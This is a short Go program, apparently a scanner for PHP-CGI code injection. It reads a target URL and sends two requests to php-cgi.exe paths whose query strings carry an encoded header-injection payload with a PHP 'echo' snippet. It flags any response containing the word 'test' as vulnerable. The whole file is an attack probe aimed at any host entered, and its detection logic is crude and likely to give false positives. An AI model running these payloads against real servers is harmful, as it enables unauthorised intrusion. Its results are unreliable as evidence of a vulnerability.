package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func main() {
	var url string
	fmt.Print("Enter the URL to test (e.g., http://example.com): ")
	fmt.Scanln(&url)

	payloads := []string{
		"/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20\"test\";?>",
		"/php-cgi/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20\"test\";?>",
	}

	for _, payload := range payloads {
		testURL := url + payload
		resp, err := http.Get(testURL)
		if err != nil {
			fmt.Printf("Error testing %s: %v\n", testURL, err)
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Error reading response from %s: %v\n", testURL, err)
			continue
		}

		if strings.Contains(string(body), "test") {
			fmt.Printf("Potential vulnerability detected at: %s\n", testURL)
		} else {
			fmt.Printf("No vulnerability detected at: %s\n", testURL)
		}
	}
}
